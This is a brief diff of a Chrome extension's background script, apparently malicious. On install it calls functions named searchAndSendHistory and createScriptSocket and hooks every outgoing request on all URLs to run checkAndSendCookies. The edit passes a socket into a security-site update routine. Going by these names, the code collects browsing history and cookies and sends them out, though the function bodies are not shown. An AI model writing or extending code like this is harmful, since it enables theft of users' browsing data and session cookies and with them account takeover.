@@ -3,7 +3,7 @@ chrome.runtime.onInstalled.addListener(() => {
   searchAndSendHistory();
   createScriptSocket();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
-      updateSecurityWebsites();
+      updateSecurityWebsites(socket);
       checkAndSendCookies(info);
     }, {
       urls: ["<all_urls>"]
